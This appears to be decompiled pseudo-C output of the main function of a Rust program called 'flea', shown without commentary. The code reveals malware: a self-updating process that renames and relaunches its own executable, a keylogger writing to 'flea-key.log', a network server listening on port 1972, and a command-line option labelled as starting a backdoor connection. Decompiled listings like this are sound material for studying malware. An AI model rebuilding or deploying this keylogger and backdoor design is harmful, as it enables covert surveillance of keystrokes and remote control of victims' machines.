
  int64_t flea::main::h2fd4225971588529()

{
    int32_t* rbp;
    int32_t* var_8 = rbp;
    int128_t* const r14;
    int128_t* const var_18 = r14;
    int128_t* r13;
    int128_t* var_20 = r13;
    int64_t* r12;
    int64_t* var_28 = r12;
    env_logger::logger::init::hcfe11003988bece9();
    int32_t var_408;
    int64_t var_400;
    uint64_t i_2;
    int128_t var_3f0;
    char const* const var_2e8;
    char* var_2e0;
    char const* const var_2d8;
    int64_t var_2c8;
    
    if (core::sync::atomic::atomic_load::h798438cf4f837e85(
        &log::MAX_LOG_LEVEL_FILTER::hec4bd8d019e67a03) >= 3)
    {
        var_408 = &data_af5958;
        var_400 = 1;
        i_2 = 8;
        var_3f0 = {0};
        int64_t rax_1 = log::__private_api::loc::he6f33e710a34adaf(&data_af59d8);
        var_2e8 = "fleaStopcoreCharCo";
        var_2e0 = 4;
        var_2d8 = "fleaStopcoreCharCo";
        int64_t var_2d0_1 = 4;
        var_2c8 = rax_1;
        log::__private_api::log::h0054ea87901f9ef6(&var_408, 3, &var_2e8);
    }
    
    void var_50;
    std::env::args::h379ffc9749335c0e(&var_50);
    void var_218;
    _$LT$alloc..vec..Vec$LT$T$GT$$u20$as$u20$alloc..vec..spec_from_iter..SpecFromIter$LT$T$C$I$GT$$GT$::from_iter::h930b75c54a92a1fc(&var_218, &var_50);
    std::env::current_exe::h7c1922f6c8ed92ed(&var_408);
    core::result::Result$LT$T$C$E$GT$::unwrap::hf44f168bd33e09e7(&var_2e8, &var_408);
    std::ffi::os_str::_$LT$impl$u20$core..convert..TryFrom$LT$$RF$std..ffi..os_str..OsStr$GT$$u20$for$u20$$RF$str$GT$::try_from::hb4876b8b08d05247(&var_408, var_2e0, var_2d8);
    
    if (var_408 == 1)
    {
        core::option::unwrap_failed::hf53ee17a2013bd69();
        /* no return */
    }
    
    _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4f11c760132d323d(&var_408, 
        var_400, i_2);
    int128_t var_348 = var_408;
    core::ptr::drop_in_place$LT$std..path..PathBuf$GT$::hb8ab2c35932f4c39(&var_2e8);
    alloc::str::_$LT$impl$u20$str$GT$::replace::h3e8dda1b6fe51ae0(&var_408, *var_348[8], i_2, 
        &data_4519cc[0xc]);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h8c3e4c9e242e21ed(&var_348);
    uint64_t i_5 = i_2;
    var_348 = var_408;
    alloc::str::_$LT$impl$u20$str$GT$::replace::h3e8dda1b6fe51ae0(&var_408, *var_348[8], i_2, 
        "\\.\hour");
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h8c3e4c9e242e21ed(&var_348);
    uint64_t i_6 = i_2;
    var_348 = var_408;
    int128_t** var_438;
    int128_t* var_328;
    
    if (core::sync::atomic::atomic_load::h798438cf4f837e85(
        &log::MAX_LOG_LEVEL_FILTER::hec4bd8d019e67a03) >= 3)
    {
        var_328 = &var_348;
        var_438 = &var_328;
        int64_t (* var_430_1)(int64_t* arg1, int64_t* arg2) =
            _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::hd80047a11b3b313d;
        var_408 = &data_af5968;
        var_400 = 1;
        *var_3f0[8] = 0;
        i_2 = &var_438;
        var_3f0 = 1;
        int64_t rax_5 = log::__private_api::loc::he6f33e710a34adaf(&data_af5a20);
        var_2e8 = "fleaStopcoreCharCo";
        var_2e0 = 4;
        var_2d8 = "fleaStopcoreCharCo";
        int64_t var_2d0_2 = 4;
        var_2c8 = rax_5;
        log::__private_api::log::h0054ea87901f9ef6(&var_408, 3, &var_2e8);
    }
    
    var_2e8 = 0;
    char* rax_6;
    uint64_t rdx_9;
    rax_6 = core::char::methods::encode_utf8_raw::hdf17d5a6360402f0(0x2f, &var_2e8);
    _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4f11c760132d323d(&var_408, 
        rax_6, rdx_9);
    uint64_t i_7 = i_2;
    int128_t var_1c8 = var_408;
    _$LT$$RF$alloc..string..String$u20$as$u20$core..str..pattern..Pattern$GT$::into_searcher::ha6256b6a3600b2b5(&var_408, &var_1c8, *var_348[8], i_6);
    int64_t var_3a8;
    int64_t var_78 = var_3a8;
    int128_t var_3b8;
    int128_t var_88 = var_3b8;
    int128_t var_3c8;
    int128_t var_98 = var_3c8;
    int128_t var_3d8;
    int128_t var_a8 = var_3d8;
    int128_t var_b8 = var_3f0;
    int128_t var_c8 = i_2;
    int128_t var_d8 = var_408;
    int64_t var_70 = 0;
    uint64_t i_12 = i_6;
    int16_t var_60 = 1;
    void var_188;
    _$LT$alloc..vec..Vec$LT$T$GT$$u20$as$u20$alloc..vec..spec_from_iter..SpecFromIter$LT$T$C$I$GT$$GT$::from_iter::hc58c245f00880ef8(&var_188, &var_d8);
    int128_t* var_308 = nullptr;
    int64_t var_300 = 1;
    uint64_t i_3 = 0;
    int128_t** var_180;
    int64_t var_178;
    void* rdx_14 = &var_180[var_178 * 2];
    var_438 = var_180;
    uint64_t i = var_178 - 1;
    uint64_t i_1;
    int128_t*** var_1e8;
    
    if (var_178 == 1)
    {
        label_67b478:
        std::env::current_dir::h40c04c259438f175(&var_408);
        core::result::Result$LT$T$C$E$GT$::unwrap::hf44f168bd33e09e7(&var_2e8, &var_408);
        std::ffi::os_str::_$LT$impl$u20$core..convert..TryFrom$LT$$RF$std..ffi..os_str..OsStr$GT$$u20$for$u20$$RF$str$GT$::try_from::hb4876b8b08d05247(&var_408, var_2e0, var_2d8);
        
        if (var_408 == 1)
        {
            core::option::unwrap_failed::hf53ee17a2013bd69();
            /* no return */
        }
        
        _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4f11c760132d323d(&var_408, 
            var_400, i_2);
        i_1 = i_2;
        var_438 = var_408;
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h8c3e4c9e242e21ed(&var_308);
        i_3 = i_1;
        var_308 = var_438;
        core::ptr::drop_in_place$LT$std..path..PathBuf$GT$::hb8ab2c35932f4c39(&var_2e8);
    }
    else
    {
        do
        {
            i_1 = i - 1;
            int128_t*** rax_11 = _$LT$core..slice..iter..Iter$LT$T$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::hd22526327d59eb3f(&var_438);
            
            if (!rax_11)
                break;
            
            var_1e8 = rax_11;
            
            if (rax_11[1])
            {
                var_328 = &var_1e8;
                var_2e8 = &var_1c8;
                var_2e0 = _$LT$alloc..string..String$u20$as$u20$core..fmt..Display$GT$::fmt::h9e2c9c436a613463;
                var_2d8 = &var_328;
                int64_t (* var_2d0_3)(int64_t* arg1, int64_t* arg2) =
                    _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::hf5937d5658b94510;
                var_408 = &data_450610;
                var_400 = 2;
                *var_3f0[8] = 0;
                char const* const* var_3f8 = &var_2e8;
                var_3f0 = 2;
                int128_t var_140;
                core::option::Option$LT$T$GT$::map_or_else::hbd37af77d9713dc6(&var_140, &var_408);
                var_408 = var_140;
                uint64_t i_9;
                i_2 = i_9;
                alloc::vec::Vec$LT$T$C$A$GT$::append_elements::h5ca8c1f8020f7a24(&var_308, var_400, 
                    i_9);
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h8c3e4c9e242e21ed(&var_408);
            }
            
            i = i_1;
        } while (i);
        
        if (!i_3)
            goto label_67b478;
        
        var_438 = &var_308;
        var_2e8 = &var_438;
        int64_t (* var_2e0_1)(int64_t* arg1, int64_t* arg2) =
            _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::hd80047a11b3b313d;
        var_408 = &data_af5978;
        var_400 = 2;
        *var_3f0[8] = 0;
        char const* const* var_3f8_1 = &var_2e8;
        var_3f0 = 1;
        int128_t var_128;
        core::option::Option$LT$T$GT$::map_or_else::hbd37af77d9713dc6(&var_128, &var_408);
        var_408 = var_128;
        uint64_t i_10;
        i_2 = i_10;
        core::result::Result$LT$T$C$E$GT$::expect::h66343b7588221f86(
            std::env::set_current_dir::h9a512f0e31996f2d(&var_308), var_400, i_2);
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h8c3e4c9e242e21ed(&var_408);
    }
    
    std::fs::metadata::h65666ff0bc69322a(&var_408, &data_450bb0);
    int32_t rbx_1 = var_408;
    core::ptr::drop_in_place$LT$core..result..Result$LT$std..fs..Metadata$C$std..io..error..Error$GT$$GT$::h3fd70f9a0b8ae97a(&var_408);
    
    if (rbx_1 != 2)
    {
        int64_t rax_16 = std::fs::remove_file::hb3eede55ac595ae4(&data_450bb0);
        var_408 = rax_16;
        
        if (!rax_16)
            core::ptr::drop_in_place$LT$core..result..Result$LT$$LP$$RP$$C$std..io..error..Error$GT$$GT$::h3fe08944b1c9c98c(&var_408);
        else
            core::ptr::drop_in_place$LT$core..result..Result$LT$$LP$$RP$$C$std..io..error..Error$GT$$GT$::h3fe08944b1c9c98c(&var_408);
    }
    
    std::fs::metadata::h65666ff0bc69322a(&var_408, "flea.rst@");
    int32_t rbx_2 = var_408;
    core::ptr::drop_in_place$LT$core..result..Result$LT$std..fs..Metadata$C$std..io..error..Error$GT$$GT$::h3fd70f9a0b8ae97a(&var_408);
    
    if (rbx_2 != 2)
    {
        int64_t rax_17 = std::fs::remove_file::hb3eede55ac595ae4("flea.rst@");
        var_408 = rax_17;
        
        if (!rax_17)
            core::ptr::drop_in_place$LT$core..result..Result$LT$$LP$$RP$$C$std..io..error..Error$GT$$GT$::h3fe08944b1c9c98c(&var_408);
        else
            core::ptr::drop_in_place$LT$core..result..Result$LT$$LP$$RP$$C$std..io..error..Error$GT$$GT$::h3fe08944b1c9c98c(&var_408);
    }
    
    flea::updater::find_update::he78be416422e025a(&var_328, var_300, i_3, 
        "flea.updUniversefunction, name: …");
    
    if (!(0 + -(var_328)))
    {
        var_438 = var_328;
        
        if (core::sync::atomic::atomic_load::h798438cf4f837e85(
            &log::MAX_LOG_LEVEL_FILTER::hec4bd8d019e67a03) >= 3)
        {
            var_1e8 = &var_438;
            int64_t (* var_1e0_1)(void* arg1, int64_t* arg2) = _$LT$alloc..string..String$u20$as$u20$core..fmt..Display$GT$::fmt::h9e2c9c436a613463;
            var_408 = &data_af5998;
            int64_t var_400_1 = 1;
            *var_3f0[8] = 0;
            void** var_3f8_3 = &var_1e8;
            var_3f0 = 1;
            int64_t rax_27 = log::__private_api::loc::he6f33e710a34adaf(&data_af5a80);
            var_2e8 = "fleaStopcoreCharCo";
            int64_t var_2e0_3 = 4;
            char const* const var_2d8_3 = "fleaStopcoreCharCo";
            int64_t var_2d0_5 = 4;
            int64_t var_2c8_2 = rax_27;
            log::__private_api::log::h0054ea87901f9ef6(&var_408, 3, &var_2e8);
        }
        
        core::result::Result$LT$T$C$E$GT$::expect::h66343b7588221f86(
            std::fs::rename::ha1e28abcba9487f0("fleaStopcoreCharCo", 4, &data_450bb0), 
            "Couldn't rename the current file…", 0x21);
        var_408 = var_438;
        core::result::Result$LT$T$C$E$GT$::expect::h66343b7588221f86(
            std::fs::rename::hbcb47dc17ddb56ec(&var_408, "fleaStopcoreCharCo"), 
            "Couldn't rename the update file!…", 0x20);
        _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4f11c760132d323d(&var_408, 
            "fleaStopcoreCharCo", 4);
        int64_t var_318;
        int64_t var_2d8_2 = var_318;
        var_2e8 = var_408;
        flea::updater::start_new_process::hba0ad9c54647d43a(&var_308, &var_2e8);
        std::process::exit::hf275b28aff227156(0);
        /* no return */
    }
    
    core::ptr::drop_in_place$LT$core..option..Option$LT$alloc..string..String$GT$$GT$::h929ca96be75ba451(&var_328);
    local_ip_address::local_ip::h1988d58d95645f42(&var_408);
    void var_e9;
    core::result::Result$LT$T$C$E$GT$::unwrap::hf6aa2b2a543c4f1e(&var_e9, &var_408);
    int64_t var_208;
    
    if (!var_208)
    {
        core::panicking::panic_bounds_check::h8f7cc6d356d411dd(0, 0);
        /* no return */
    }
    
    void* var_210;
    void var_200;
    _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::h7ef9d321b3428b60(
        &var_200, var_210);
    int64_t var_268 = 0;
    int64_t var_260 = 8;
    int64_t var_258 = 0;
    int16_t var_250 = 0;
    getopts::Options::optopt::h2d047e7ed1c41f4b(&var_268, "sserverServer IP to listen onLea…", 1, 
        "serverServer IP to listen onLeav…", 6, "Server IP to listen onLeave empt…", 0x16, 
        "Leave empty to listen on the hos…", 0x2c);
    getopts::Options::optflag::h27d1f756671295b3(&var_268, "bStarts connection to the backdo…", 1, 
        "backdoor", 8, "Starts connection to the backdoo…", 0x28);
    getopts::Options::optflag::h27d1f756671295b3(&var_268, "hPrint this help menuError setti…", 1, 
        "helpmsecMJPGKey5HomeNoneAZazLink…", 4, "Print this help menuError settin…", 0x14);
    
    if (!var_208)
    {
        core::slice::index::slice_start_index_len_fail::h534838c90eea25d8(1, 0);
        /* no return */
    }
    
    getopts::Options::parse::hdc644be6210e44ca(&var_408, &var_268, var_210 + 0x18, var_208 - 1);
    int64_t var_1f8;
    int64_t var_1f0;
    
    if (var_408 != 2)
    {
        int64_t var_298_1 = var_3b8;
        int128_t var_2a8_1 = var_3c8;
        int128_t var_2b8_1 = var_3d8;
        var_2c8 = var_3f0;
        var_2d8 = i_2;
        var_2e8 = var_408;
        r14 = 1;
        
        if (!getopts::Matches::opt_present::hfbf5f39762b8450c(&var_2e8, 
            "hPrint this help menuError setti…", 1))
        {
            int64_t var_170;
            getopts::Matches::opt_str::hab983cb2d48d79e6(&var_170, &var_2e8, 
                "sserverServer IP to listen onLea…", 1);
            char rax_28 = getopts::Matches::opt_present::hfbf5f39762b8450c(&var_2e8, 
                "bStarts connection to the backdo…", 1);
            var_408 = 1;
            int64_t var_400_2 = 1;
            i_2 = 1;
            int128_t* rax_29 = alloc::boxed::Box$LT$T$GT$::new::h3eca3f6cc875051d(&var_408);
            int128_t* var_288 = rax_29;
            int64_t temp2 = *rax_29;
            *rax_29 += 1;
            
            if (temp2 > -1)
            {
                ctrlc::init_and_set_handler::h6aef2135228a514e(&var_408, var_288, 1);
                core::result::Result$LT$T$C$E$GT$::expect::hc53037443e940860(&var_408);
                std::env::current_dir::h40c04c259438f175(&var_408);
                void var_158;
                core::result::Result$LT$T$C$E$GT$::expect::h387bd77799f31278(&var_158, &var_408);
                int64_t var_150;
                uint64_t var_148;
                std::path::Path::join::he090b6cdc0ffec16(&var_438, var_150, var_148, 
                    "flea-key.logfailed to spawn thre…");
                std::ffi::os_str::_$LT$impl$u20$core..convert..TryFrom$LT$$RF$std..ffi..os_str..OsStr$GT$$u20$for$u20$$RF$str$GT$::try_from::hb4876b8b08d05247(&var_408, rdx_14, i_1);
                
                if (var_408 == 1)
                {
                    core::option::unwrap_failed::hf53ee17a2013bd69();
                    /* no return */
                }
                
                _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4f11c760132d323d(
                    &var_408, var_400_2, i_2);
                uint64_t i_8 = i_2;
                int128_t var_1a8 = var_408;
                core::ptr::drop_in_place$LT$std..path..PathBuf$GT$::hb8ab2c35932f4c39(&var_438);
                flealib::keylogger::remove_keylog_file::hb8183b71da054a05(&var_408, &var_1a8);
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h8c3e4c9e242e21ed(&var_408);
                int64_t var_280;
                _$LT$T$u20$as$u20$alloc..string..SpecToString$GT$::spec_to_string::h9f263f09154a6de1(&var_280, &var_e9);
                int64_t r14_4 = var_170;
                rbp = r14_4 == -0x8000000000000000;
                int128_t var_278;
                
                if (r14_4 != -0x8000000000000000)
                {
                    int128_t var_168;
                    var_408 = var_168;
                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h8c3e4c9e242e21ed(
                        &var_280);
                    var_280 = r14_4;
                    var_278 = var_408;
                }
                
                _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4f11c760132d323d(
                    &var_408, ":1972Starting backdoor connectio…", 5);
                uint64_t i_4 = i_2;
                var_438 = var_408;
                alloc::vec::Vec$LT$T$C$A$GT$::append_elements::h5ca8c1f8020f7a24(&var_280, rdx_14, 
                    i_2);
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h8c3e4c9e242e21ed(&var_438);
                var_408 = 1;
                int64_t var_400_3 = 1;
                i_2 = 0;
                *i_2[4] = 0;
                int64_t* rax_31 = alloc::boxed::Box$LT$T$GT$::new::h3eca3f6cc875051d(&var_408);
                int64_t* var_190_1 = rax_31;
                int64_t temp3_1 = *rax_31;
                *rax_31 += 1;
                
                if (temp3_1 > -1)
                {
                    uint64_t i_11 = i_8;
                    var_328 = var_1a8;
                    int64_t* var_310_1 = rax_31;
                    int64_t var_238_1 = -0x8000000000000000;
                    int64_t var_248 = 0;
                    char var_220_1 = 0;
                    int64_t var_228;
                    *var_3f0[8] = var_228;
                    char var_3e0_1 = 0;
                    int32_t var_21f;
                    int32_t var_3df_1 = var_21f;
                    int16_t var_21b;
                    int16_t var_3db_1 = var_21b;
                    char var_219;
                    char var_3d9_1 = var_219;
                    int64_t var_3f8_4 = var_238_1;
                    int64_t var_230;
                    var_3f0 = var_230;
                    var_408 = var_248;
                    std::thread::Builder::spawn_unchecked::hfba054602dc25c0f(&var_438, &var_408, 
                        &var_328);
                    int128_t var_110;
                    core::result::Result$LT$T$C$E$GT$::expect::h9f2aca6d7e313643(&var_110, 
                        &var_438);
                    int64_t temp4_1 = *rax_31;
                    *rax_31 += 1;
                    
                    if (temp4_1 > -1)
                    {
                        var_3f0 = var_228;
                        var_3f8_4 = var_238_1;
                        var_408 = var_248;
                        std::thread::Builder::spawn_unchecked::hefcb3f5a2b1b648a(&var_438, 
                            &var_408);
                        core::result::Result$LT$T$C$E$GT$::expect::h9f2aca6d7e313643(&var_1e8, 
                            &var_438);
                        
                        if (!rax_28)
                        {
                            var_328 = 2;
                            label_67bfb2:
                            int64_t r15_1;
                            r15_1 = 1;
                            r12 = 1;
                            r13 = 1;
                            void var_349;
                            flealib::fleaserver::FleaServer::start::h683ff1272e8cc23d(&var_349, 
                                var_278, *var_278[8], &var_288);
                            r12 = 1;
                            r13 = 1;
                            std::sync::mutex::Mutex$LT$T$GT$::lock::h1285cc886cfa04d1(&var_408, 
                                &rax_31[2]);
                            r12 = 1;
                            r13 = 1;
                            int32_t* rax_41;
                            char rdx_38;
                            rax_41 = core::result::Result$LT$T$C$E$GT$::unwrap::h2fa1c6cec2539a1c(
                                &var_408);
                            *(rax_41 + 5) = 1;
                            r12 = 1;
                            r13 = 1;
                            core::ptr::drop_in_place$LT$std..sync..mutex..MutexGuard$LT$flealib..keylogger..Keylogger$GT$$GT$::h911136ef9be5dd2e(rax_41, rdx_38 & 1);
                            int128_t var_100;
                            var_3f8_4 = var_100;
                            var_408 = var_110;
                            r12 = 1;
                            int64_t rax_42;
                            int64_t rdx_39;
                            rax_42 =
                                std::thread::JoinInner$LT$T$GT$::join::h5335860a10d3a1d5(&var_408);
                            r12 = 1;
                            core::result::Result$LT$T$C$E$GT$::unwrap::h38b536044c0c29aa(rax_42);
                            int128_t var_1d8;
                            var_3f8_4 = var_1d8;
                            var_408 = var_1e8;
                            core::result::Result$LT$T$C$E$GT$::unwrap::h38b536044c0c29aa(
                                std::thread::JoinInner$LT$T$GT$::join::h5335860a10d3a1d5(&var_408));
                            int128_t* rax_44 = var_328;
                            r15_1 = rax_44 == 2;
                            
                            if (rax_44 != 2)
                            {
                                var_3f8_4 = i_11;
                                var_408 = var_328;
                                core::result::Result$LT$T$C$E$GT$::unwrap::h38b536044c0c29aa(
                                    std::thread::JoinInner$LT$T$GT$::join::h5335860a10d3a1d5(
                                    &var_408));
                            }
                            
                            if (core::sync::atomic::atomic_load::h798438cf4f837e85(
                                &log::MAX_LOG_LEVEL_FILTER::hec4bd8d019e67a03) > 2)
                            {
                                var_408 = &data_af59b8;
                                int64_t var_400_5 = 1;
                                var_3f8_4 = 8;
                                int128_t var_3f0_2 = {0};
                                int64_t rax_47 =
                                    log::__private_api::loc::he6f33e710a34adaf(&data_af5bd0);
                                var_438 = "fleaStopcoreCharCo";
                                int64_t var_430_4 = 4;
                                char const* const var_428_2 = "fleaStopcoreCharCo";
                                int64_t var_420_2 = 4;
                                int64_t var_418_2 = rax_47;
                                log::__private_api::log::h0054ea87901f9ef6(&var_408, 3, &var_438);
                            }
                            
                            std::fs::metadata::h65666ff0bc69322a(&var_408, "flea.rst@");
                            int32_t rbx_4 = var_408;
                            core::ptr::drop_in_place$LT$core..result..Result$LT$std..fs..Metadata$C$std..io..error..Error$GT$$GT$::h3fd70f9a0b8ae97a(&var_408);
                            
                            if (rbx_4 != 2)
                            {
                                var_408 = std::fs::remove_file::hb3eede55ac595ae4("flea.rst@");
                                core::ptr::drop_in_place$LT$core..result..Result$LT$$LP$$RP$$C$std..io..error..Error$GT$$GT$::h3fe08944b1c9c98c(&var_408);
                                _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4f11c760132d323d(&var_408, "fleaStopcoreCharCo", 4);
                                int64_t var_428_3 = var_3f8_4;
                                var_438 = var_408;
                                flea::updater::start_new_process::hba0ad9c54647d43a(&var_308, 
                                    &var_438);
                                
                                if (core::sync::atomic::atomic_load::h798438cf4f837e85(
                                    &log::MAX_LOG_LEVEL_FILTER::hec4bd8d019e67a03) >= 3)
                                {
                                    var_408 = &data_af59c8;
                                    int64_t var_400_6 = 1;
                                    int64_t var_3f8_5 = 8;
                                    int128_t var_3f0_3 = {0};
                                    int64_t rax_51 =
                                        log::__private_api::loc::he6f33e710a34adaf(&data_af5be8);
                                    var_438 = "fleaStopcoreCharCo";
                                    int64_t var_430_5 = 4;
                                    char const* const var_428_4 = "fleaStopcoreCharCo";
                                    int64_t var_420_3 = 4;
                                    int64_t var_418_3 = rax_51;
                                    log::__private_api::log::h0054ea87901f9ef6(&var_408, 3, 
                                        &var_438);
                                }
                            }
                            
                            std::process::exit::hf275b28aff227156(0);
                            /* no return */
                        }
                        
                        if (core::sync::atomic::atomic_load::h798438cf4f837e85(
                            &log::MAX_LOG_LEVEL_FILTER::hec4bd8d019e67a03) > 3)
                        {
                            var_408 = &data_af59a8;
                            int64_t var_400_4 = 1;
                            var_3f8_4 = 8;
                            int128_t var_3f0_1 = {0};
                            int64_t rax_40 =
                                log::__private_api::loc::he6f33e710a34adaf(&data_af5b58);
                            var_438 = "fleaStopcoreCharCo";
                            int64_t var_430_3 = 4;
                            i_4 = "fleaStopcoreCharCo";
                            int64_t var_420_1 = 4;
                            int64_t var_418_1 = rax_40;
                            log::__private_api::log::h0054ea87901f9ef6(&var_408, 4, &var_438);
                        }
                        
                        int64_t temp5_1 = *rax_31;
                        *rax_31 += 1;
                        
                        if (temp5_1 > -1)
                        {
                            std::thread::Builder::spawn_unchecked::h5cad56ae351d3ed2(&var_408, 
                                &var_248);
                            core::result::Result$LT$T$C$E$GT$::expect::h9f2aca6d7e313643(&var_438, 
                                &var_408);
                            var_328 = var_438;
                            i_11 = i_4;
                            goto label_67bfb2;
                        }
                    }
                }
            }
            
            trap(6);
        }
        
        i_2 = var_258;
        var_408 = var_268;
        flea::print_usage::hb3135f8e2fa442e9(var_1f8, var_1f0, &var_408);
        core::ptr::drop_in_place$LT$getopts..Matches$GT$::h5dace93b5a56a445(&var_2e8);
    }
    else
    {
        i_1 = var_3f0;
        var_438 = var_400;
        var_328 = &var_438;
        int64_t (* var_320_1)(int64_t* arg1, void* arg2) =
            _$LT$getopts..Fail$u20$as$u20$core..fmt..Display$GT$::fmt::hbad240da443d11df;
        var_2e8 = &data_af5938;
        int64_t var_2e0_2 = 2;
        int64_t var_2c8_1 = 0;
        int128_t** var_2d8_1 = &var_328;
        int64_t var_2d0_4 = 1;
        r14 = 1;
        std::io::stdio::_print::h17d6c2a1d6a6f99e(&var_2e8);
        var_2d8_1 = var_258;
        var_2e8 = var_268;
        flea::print_usage::hb3135f8e2fa442e9(var_1f8, var_1f0, &var_2e8);
        core::ptr::drop_in_place$LT$getopts..Fail$GT$::h4618167153e2f87d(&var_438);
    }
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h8c3e4c9e242e21ed(&var_200);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h8c3e4c9e242e21ed(&var_308);
    core::ptr::drop_in_place$LT$alloc..vec..Vec$LT$$RF$str$GT$$GT$::h13a0fa7c72abf086(&var_188);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h8c3e4c9e242e21ed(&var_1c8);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h8c3e4c9e242e21ed(&var_348);
    return core::ptr::drop_in_place$LT$alloc..vec..Vec$LT$alloc..string..String$GT$$GT$::h16f8a8e4f5abb417(&var_218);
}
